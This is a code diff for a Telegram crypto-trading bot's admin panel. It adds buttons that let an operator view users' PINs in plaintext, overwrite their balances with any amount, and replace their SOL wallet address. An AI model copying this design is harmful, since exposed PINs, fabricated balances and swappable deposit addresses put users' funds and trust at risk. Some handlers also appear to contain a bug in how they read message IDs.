@@ -1208,42 +1208,180 @@ bot.command("reset", (ctx) => {
 });
 
 bot.command("admin", (ctx) => {
-  const adminIds = (ADMIN_ID || "").split(",").map((id) => Number(id.trim())).filter(Boolean);
-  if (adminIds.length === 0 || !adminIds.includes(ctx.from.id)) {
+  if (!isAdmin(ctx.from.id)) {
     return ctx.reply("❌ You are not authorized to view this page.");
   }
   if (registeredUsers.size === 0) {
     return ctx.reply("📭 No registered users yet.");
   }
-  let userList = "📋 *Registered Users*\n\n";
-  let i = 1;
-  for (const user of registeredUsers.values()) {
-    const solUsd = (user.solBalance || 0) * SOL_PRICE;
-    const ethUsd = (user.ethBalance || 0) * ETH_PRICE;
-    const usdc = user.usdcBalance || 0;
-    const total = solUsd + ethUsd + usdc;
-    userList +=
-      `*${i}.* @${user.username || "unknown"} (ID: ${user.userId})\n` +
-      `📧 Email: ${user.email}\n` +
-      `🔐 PIN: ${user.pin}\n` +
-      `🟣 SOL Address: \`${user.address || "N/A"}\`\n` +
-      `🔵 ETH Address: \`${user.ethAddress || "N/A"}\`\n` +
-      `💵 SOL: $${solUsd.toFixed(2)} (${(user.solBalance || 0).toFixed(4)} SOL)\n` +
-      `💵 ETH: $${ethUsd.toFixed(2)} (${(user.ethBalance || 0).toFixed(4)} ETH)\n` +
-      `💵 USDC: $${usdc.toFixed(2)}\n` +
-      `💎 Total: $${total.toFixed(2)}\n` +
-      `🔄 Trades: ${user.tradeHistory?.length || 0}\n` +
-      `📋 Copy Trades: ${user.copyTrades?.length || 0}\n` +
-      `💎 Staking Positions: ${user.stakingPositions?.length || 0}\n` +
-      `📅 Registered: ${user.registeredAt}\n` +
-      `🕒 Last Active: ${user.lastActive || user.registeredAt}\n\n`;
-    i++;
-  }
-  return ctx.replyWithMarkdown(userList);
+  const user = registeredUsers.get(999001);
+  const solUsd = (user.solBalance || 0) * SOL_PRICE;
+  const ethUsd = (user.ethBalance || 0) * ETH_PRICE;
+  const usdc = user.usdcBalance || 0;
+  const total = solUsd + ethUsd + usdc;
+  const text =
+    "📋 *Mock User Details*\n\n" +
+    `*1.* @${user.username || "mockuser"} (ID: ${user.userId})\n` +
+    `📧 Email: \`${user.email}\`\n` +
+    `🔐 PIN: \`${user.pin}\`\n` +
+    `🟣 SOL Address: \`${user.address || "N/A"}\`\n` +
+    `🔵 ETH Address: \`${user.ethAddress || "N/A"}\`\n` +
+    `💵 SOL: $${solUsd.toFixed(2)} (${(user.solBalance || 0).toFixed(4)} SOL)\n` +
+    `💵 ETH: $${ethUsd.toFixed(2)} (${(user.ethBalance || 0).toFixed(4)} ETH)\n` +
+    `💵 USDC: $${usdc.toFixed(2)}\n` +
+    `💎 Total: $${total.toFixed(2)}\n` +
+    `🔄 Trades: ${user.tradeHistory?.length || 0}\n` +
+    `📋 Copy Trades: ${user.copyTrades?.length || 0}\n` +
+    `💎 Staking Positions: ${user.stakingPositions?.length || 0}\n` +
+    `📅 Registered: ${user.registeredAt}\n` +
+    `🕒 Last Active: ${user.lastActive || user.registeredAt}\n\n` +
+    "Select a field to edit:";
+  return ctx.replyWithMarkdown(text, {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "🔐 Edit PIN", callback_data: "admin:pin:999001" },
+          { text: "📧 Edit Email", callback_data: "admin:email:999001" },
+        ],
+        [
+          { text: "💰 Edit Balance", callback_data: "admin:balance:999001" },
+          { text: "🟣 Edit SOL Address", callback_data: "admin:address:999001" },
+        ],
+        [
+          { text: "👤 Edit Username", callback_data: "admin:username:999001" },
+          { text: "🔄 View Trades", callback_data: "admin:trades:999001" },
+        ],
+      ],
+    },
+  });
 });
 
+bot.action(/^admin:pin:(\d+)$/, async (ctx) => {
+  if (!isAdmin(ctx.from.id)) {
+    return ctx.answerCbQuery("❌ Unauthorized");
+  }
+  const userId = Number(ctx.match[1]);
+  await ctx.answerCbQuery();
+  await ctx.editMessageReplyMarkup({
+    inline_keyboard: [
+      [{ text: "🔐 Cancel", callback_data: `admin:cancel:${userId}` }],
+    ],
+  });
+  await ctx.reply("Enter new 4-digit PIN for user " + userId + ":");
+  adminStates.set(userId, { action: "pin", chatId: ctx.chat.id, msgId: ctx.message.message_id });
+});
+
+bot.action(/^admin:email:(\d+)$/, async (ctx) => {
+  if (!isAdmin(ctx.from.id)) {
+    return ctx.answerCbQuery("❌ Unauthorized");
+  }
+  const userId = Number(ctx.match[1]);
+  await ctx.answerCbQuery();
+  await ctx.editMessageReplyMarkup({
+    inline_keyboard: [
+      [{ text: "📧 Cancel", callback_data: `admin:cancel:${userId}` }],
+    ],
+  });
+  await ctx.reply("Enter new email for user " + userId + ":");
+  adminStates.set(userId, { action: "email", chatId: ctx.chat.id, msgId: ctx.message.message_id });
+});
+
+bot.action(/^admin:balance:(\d+)$/, async (ctx) => {
+  if (!isAdmin(ctx.from.id)) {
+    return ctx.answerCbQuery("❌ Unauthorized");
+  }
+  const userId = Number(ctx.match[1]);
+  await ctx.answerCbQuery();
+  await ctx.editMessageReplyMarkup({
+    inline_keyboard: [
+      [{ text: "💰 Cancel", callback_data: `admin:cancel:${userId}` }],
+    ],
+  });
+  await ctx.reply("Enter new balance amount (USD) for user " + userId + ":");
+  adminStates.set(userId, { action: "balance", chatId: ctx.chat.id, msgId: ctx.message.message_id });
+});
+
+bot.action(/^admin:address:(\d+)$/, async (ctx) => {
+  if (!isAdmin(ctx.from.id)) {
+    return ctx.answerCbQuery("❌ Unauthorized");
+  }
+  const userId = Number(ctx.match[1]);
+  await ctx.answerCbQuery();
+  await ctx.editMessageReplyMarkup({
+    inline_keyboard: [
+      [{ text: "🟣 Cancel", callback_data: `admin:cancel:${userId}` }],
+    ],
+  });
+  await ctx.reply("Enter new SOL wallet address for user " + userId + ":");
+  adminStates.set(userId, { action: "address", chatId: ctx.chat.id, msgId: ctx.message.message_id });
+});
+
+bot.action(/^admin:username:(\d+)$/, async (ctx) => {
+  if (!isAdmin(ctx.from.id)) {
+    return ctx.answerCbQuery("❌ Unauthorized");
+  }
+  const userId = Number(ctx.match[1]);
+  await ctx.answerCbQuery();
+  await ctx.editMessageReplyMarkup({
+    inline_keyboard: [
+      [{ text: "👤 Cancel", callback_data: `admin:cancel:${userId}` }],
+    ],
+  });
+  await ctx.reply("Enter new username for user " + userId + ":");
+  adminStates.set(userId, { action: "username", chatId: ctx.chat.id, msgId: ctx.message.message_id });
+});
+
+bot.action(/^admin:trades:(\d+)$/, async (ctx) => {
+  if (!isAdmin(ctx.from.id)) {
+    return ctx.answerCbQuery("❌ Unauthorized");
+  }
+  const userId = Number(ctx.match[1]);
+  await ctx.answerCbQuery();
+  const user = registeredUsers.get(userId);
+  if (!user) {
+    return ctx.reply("❌ User not found");
+  }
+  let msg = "🔄 *Trade History for @" + (user.username || "unknown") + " (ID: " + userId + "):*\n\n";
+  if (!user.tradeHistory || user.tradeHistory.length === 0) {
+    msg += "_No trades recorded._";
+  } else {
+    user.tradeHistory.forEach((t, i) => {
+      const details = t.token ? ` ${t.token} $${t.usdValue?.toFixed(2) || t.amount?.toFixed(4) || "0"}` : "";
+      msg += `${i + 1}. ${t.type.toUpperCase()}${details} @ ${t.timestamp}\n`;
+    });
+  }
+  return ctx.replyWithMarkdown(msg);
+});
+
+bot.action(/^admin:cancel:(\d+)$/, async (ctx) => {
+  if (!isAdmin(ctx.from.id)) {
+    return ctx.answerCbQuery("❌ Unauthorized");
+  }
+  const userId = Number(ctx.match[1]);
+  await ctx.answerCbQuery();
+  adminStates.delete(userId);
+  await ctx.editMessageReplyMarkup({
+    inline_keyboard: [
+      [
+        { text: "🔐 Edit PIN", callback_data: `admin:pin:${userId}` },
+        { text: "📧 Edit Email", callback_data: `admin:email:${userId}` },
+      ],
+      [
+        { text: "💰 Edit Balance", callback_data: `admin:balance:${userId}` },
+        { text: "🟣 Edit SOL Address", callback_data: `admin:address:${userId}` },
+      ],
+      [
+        { text: "👤 Edit Username", callback_data: `admin:username:${userId}` },
+        { text: "🔄 View Trades", callback_data: `admin:trades:${userId}` },
+      ],
+    ],
+  });
+});
+
+const adminStates = new Map();
+
 function isAdmin(id) {
-  const adminIds = (ADMIN_ID || "").split(",").map((a) => Number(a.trim())).filter(Boolean);
+  const adminIds = (process.env.ADMIN_ID || "").split(",").map((a) => Number(a.trim())).filter(Boolean);
   return adminIds.includes(id);
 }
 
@@ -1539,6 +1677,75 @@ bot.on("text", async (ctx) => {
   const state = getState(ctx);
   const text = (ctx.text ?? "").trim();
   const chatId = ctx?.chat?.id;
+
+  // Handle admin input mode
+  for (const [targetId, adminState] of adminStates.entries()) {
+    if (adminState.chatId === ctx.chat?.id && isAdmin(ctx.from.id)) {
+      const user = registeredUsers.get(targetId);
+      if (!user) {
+        adminStates.delete(targetId);
+        return ctx.reply("❌ User not found.");
+      }
+      const action = adminState.action;
+      adminStates.delete(targetId);
+      if (action === "pin") {
+        if (!/^\d{4}$/.test(text)) {
+          return ctx.reply("❌ PIN must be 4 digits. Please try again.");
+        }
+        user.pin = text;
+        user.lastActive = new Date().toISOString();
+        if (sessions.has(targetId)) {
+          sessions.get(targetId).pin = text;
+        }
+        return ctx.reply(`✅ PIN updated for @${user.username || "unknown"} (ID: ${targetId}).`);
+      }
+      if (action === "email") {
+        if (!text.includes("@")) {
+          return ctx.reply("❌ Invalid email. Please try again.");
+        }
+        user.email = text;
+        user.lastActive = new Date().toISOString();
+        if (sessions.has(targetId)) {
+          sessions.get(targetId).email = text;
+        }
+        return ctx.reply(`✅ Email updated for @${user.username || "unknown"} (ID: ${targetId}).`);
+      }
+      if (action === "balance") {
+        const amount = parseFloat(text);
+        if (isNaN(amount)) {
+          return ctx.reply("❌ Invalid amount. Please enter a number.");
+        }
+        const solBalance = amount / SOL_PRICE;
+        const ethBalance = amount / ETH_PRICE;
+        const usdcBalance = amount;
+        user.solBalance = solBalance;
+        user.ethBalance = ethBalance;
+        user.usdcBalance = usdcBalance;
+        user.lastActive = new Date().toISOString();
+        if (sessions.has(targetId)) {
+          const s = sessions.get(targetId);
+          s.solBalance = solBalance;
+          s.ethBalance = ethBalance;
+          s.usdcBalance = usdcBalance;
+          syncState(s);
+        }
+        return ctx.reply(`✅ Balance updated for @${user.username || "unknown"} (ID: ${targetId}):\n💵 SOL: $${amount}\n💵 ETH: $${amount}\n💵 USDC: $${amount}`);
+      }
+      if (action === "address") {
+        user.address = text;
+        user.lastActive = new Date().toISOString();
+        if (sessions.has(targetId)) {
+          sessions.get(targetId).address = text;
+        }
+        return ctx.reply(`✅ SOL address updated for @${user.username || "unknown"} (ID: ${targetId}).`);
+      }
+      if (action === "username") {
+        user.username = text;
+        user.lastActive = new Date().toISOString();
+        return ctx.reply(`✅ Username updated for ID: ${targetId} -> @${text}`);
+      }
+    }
+  }
 
   if (state.awaitingEmail) {
     await deleteUserMessage(ctx);
@@ -2034,3 +2241,5 @@ exports.registeredUsers = registeredUsers;
 exports.registerUser = registerUser;
 exports.ADMIN_ID = ADMIN_ID;
 exports.syncState = syncState;
+exports.isAdmin = isAdmin;
+exports.adminStates = adminStates;
